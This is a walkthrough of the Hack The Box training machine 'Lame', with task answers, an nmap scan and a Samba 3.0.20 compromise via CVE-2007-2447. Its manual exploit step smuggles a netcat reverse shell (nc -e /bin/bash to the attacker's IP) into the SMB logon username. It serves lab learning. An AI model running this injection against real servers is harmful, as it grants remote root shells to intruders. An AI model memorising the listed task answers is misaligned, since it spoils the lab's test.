---
icon: face-cowboy-hat
---

# HTB-LAME

<figure><img src="../../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

#### 1. Overview

Lame is a Linux machine and the **first-ever box** on Hack The Box. It introduces beginners to **basic enumeration**, **service exploitation**, and **gaining root via Samba vulnerabilities**. The exploitation path is simple and straightforward, requiring only a single exploit to achieve root.

#### 2. Why It Matters

* Introduces **Samba service exploitation**, a recurring theme in real-world pentests.
* Demonstrates importance of **version enumeration**.
* First step toward mastering **remote code execution via misconfigured services**.
* Forms a solid base for understanding how **firewall rules (iptables)** affect exploitation.

#### 3. Tools & Commands

| Tool                  | Purpose                       |
| --------------------- | ----------------------------- |
| `nmap`                | Port and service enumeration  |
| `searchsploit`        | Finding public exploits       |
| `msfconsole`          | Exploitation via Metasploit   |
| `netcat (nc)`         | Reverse shell listener        |
| `netstat`, `iptables` | Post-exploitation enumeration |

recon tools : Autorecon / ReconScan / Reconnoitre

### HTB Lame – Questions & Answers

***

**Task 1**

**Q:** How many of the Nmap top 1000 TCP ports are open on the remote host?

**A:** `4`

***

**Task 2**

**Q:** What version of VSFTPd is running on Lame?

**A:** `2.3.4`

***

**Task 3**

**Q:** There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?

**A:** `no`

***

**Task 4**

**Q:** What version of Samba is running on Lame? Give the numbers up to but not including "-Debian".

**A:** `3.0.20`

***

**Task 5**

**Q:** What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the SamrChangePassword function when the "username map script" option is enabled in smb.conf?

**A:** `CVE-2007-2447`

***

**Task 6**

**Q:** Exploiting CVE-2007-2447 returns a shell as which user?

**A:** `root`

***

**Submit User Flag**

**Q:** Submit the flag located in the makis user's home directory.

**A:** `User flag owned`

***

**Submit Root Flag**

**Q:** Submit the flag located in root's home directory.

**A:** `Root flag owned`

***

### Enumeration

1. Here's the Nmap scan result:

```
# Nmap 7.70 scan initiated Fri Nov  1 12:30:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/xml/_quick_tcp_nmap.xml 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.26s latency).
Scanned at 2019-11-01 12:30:13 PDT for 94s
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h00m15s, deviation: 0s, median: 4h00m15s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 22727/tcp): CLEAN (Timeout)
|   Check 3 (port 47197/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-11-01T15:31:21-04:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  1 12:31:47 2019 -- 1 IP address (1 host up) scanned in 93.91 seconds
```

#### Nmap reveals `vsFTPd 2.3.4`, `OpenSSH` and FTP `Samba` running on the target server.

Step 2 : We note that the FTP server is configured to allow anonymous login. We connect to the server using the credentials `anonymous:anonymous` and see that there are no files to enumerate:

### FTP LOGIN

<figure><img src="../../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

Vulnerable Ftp

```
searchsploit vsftpd 2.3.4
```

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

I tried to execute the exploit but it failed every time :(

### FOOTHOLD

Now we gonna Search for Public exploit for SAMBA 3.0.20 means We use searchsploit to check for exploits for the samba service on the target

<figure><img src="../../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

### Exploiting server Using Metasploit

<figure><img src="../../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

### Manual Exploition Without Metasploit

```
logon “./=`nohup nc -e /bin/bash 10.10.14.7 4444`"
```

<figure><img src="../../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

* logon:- it is used to login into smb
* nohup:-run a command immune to hangups, with output to a non-tty<br>

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
